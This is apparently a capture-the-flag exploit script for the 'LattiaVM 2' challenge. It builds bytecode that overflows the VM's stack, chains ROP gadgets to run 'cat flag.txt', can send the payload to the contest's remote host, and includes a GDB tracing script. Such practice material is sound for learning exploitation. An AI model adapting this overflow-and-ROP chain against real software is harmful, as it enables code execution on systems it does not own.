"""
debug.py: LattiaVM 2 Debugger
place this file next to `lattia-vm-patched`

Usage:

# run locally
python3 debug.py
# run in docker
python3 debug.py DOCKER
# run on remote
python3 debug.py REMOTE

# debug, visualize step-by-step
python3 debug.py GDB
# debug, skip iterations until stack pointer hits 256
python3 debug.py GDB OVERFLOW
# debug, skip iterations until opcode 0x0d ("HALT") is hit
python3 debug.py GDB HALT
# debug, enable ASLR (works with or without OVERFLOW/HALT)
python3 debug.py GDB ASLR
"""

from pwn import *

stack_overflow = """
00 17
00 01 0c 01 03
    0b 0b 0b 0b
    0b 0b 0b 0b
    0b 0b 0b
0b 00 00 07 02
00 86 0b 02
0b 0b
"""

build_rop = """
0c 06
00 33 0b 04 00 19 02
02
0b 00 01 02
0b
00 14 00 47 04 00 09 02 00 78 04
02
0c 02
0c 06 01
0c 07
0c 06
0b 0b
0c 06 01
0c 07

0c 09
0c 03
0c 0a
00 f0
0c 01 03
0c 04 01
"""
push_cmd = """
00 80 0b 02

0b 0b 0b
   00 20
04 00 74 02
04 00 61 02
04 00 63 02
0c 01

0b 0b 0b
   00 67
04 00 61 02
04 00 6c 02
04 00 66 02
0c 01

0b 0b 0b
   00 74
04 00 78 02
04 00 74 02
04 00 2e 02
0c 01

0b 03
"""
bytecode = stack_overflow + build_rop + push_cmd + '0d'
bytecode = ''.join(bytecode.split())

print(bytecode)

skip_value = 2 if args.HALT else 1 if args.OVERFLOW else 0
gdbscript = f'set $SKIP = {skip_value}' + r"""
set gdb-workaround-stop-event enabled
set $codestr = *(char**)($rsp+0x10)
set $codeptr = "                                                                                                                                                                                                                                                              "
set $opcodes = "PUSH\0POP \0ADD \0SUB \0MUL \0DIV \0JMP \0JNE \0JE  \0JG  \0PRNT\0DUP \0SWAP\0HALT\0"
set $vmdbg = 0

brva 0x11a9
brva 0x1967
commands
    silent
    if !$vmdbg
        set context-sections ''
        set $vmdbg = 1
    end
    set $len = *(int*)($rbp-0x98)
    set $vmbc = *(char**)($rbp-0x90)
    set $vmstk = *(int**)($rbp-0x88)
    set $vmip = *(int*)($rbp-0x74)
    set $iters = *(int*)($rbp-0x70)

    set $vmsp = *(int*)($vmstk+0x100)
    set $vmop = *(char*)($vmbc+$vmip)
    set $opname = $opcodes+($vmop*5)
    set $vmnext = -1

    if $vmop==0x0 || $vmop==0x6 || $vmop==0x7 || $vmop==0x8 || $vmop==0x9 || $vmop==0xc
        set $vmnext = *(char*)($vmbc+$vmip+1) & 0xff
    end

    set $elements_skipped = ($vmsp-8)/16*16

    printf "ip: %d sp: %d, iters: %d, len: %d\n", $vmip, $vmsp, $iters, $len
    if ($SKIP==1 && $vmsp<256) || ($SKIP==2 && $vmop != 0x0d)
        continue
    end
    printf "bc: %s\n", $codestr
    printf "    %s^^", ($codeptr+254-($vmip*2))
    if $vmnext!=-1
        printf "^^"
    end
    printf " op: %s", $opname
    if $vmnext!=-1
        printf " 0x%x", $vmnext
    end
    printf "\n"

    printf "(%d elements skipped)\n", $elements_skipped
    x/32wx $vmstk+($elements_skipped)

    if $vmsp > 256
        printf "\n"
        telescope *(void**)$rbp
    end
end

brva 0x1293
commands
    set context-sections 'regs disasm code ghidra stack backtrace expressions threads heap_tracker'
    set $vmdbg = 0
end
"""

vuln = '../dist/lattia-vm'
if args.GDB:
    io = gdb.debug(
        [vuln, bytecode],
        gdbscript=gdbscript,
        aslr=args.ASLR,
    )
elif args.DOCKER:
    io = remote('localhost', 5000)
    io.sendline(bytecode.encode())
elif args.REMOTE:
    io = remote('lattia-vm-2.instances.ctf.l3ak.team', 1337, ssl=True)
    io.sendline(bytecode.encode())
else:
    io = process([vuln, bytecode])

while True:
    line = io.recvline().decode()
    print(line, end='')
    try:
        n = int(line) & 0xffffffff
        print(f'= {n:0>8x}')
        print()
    except:
        pass
    if 'Goodbye!' in line:
        break

io.interactive()
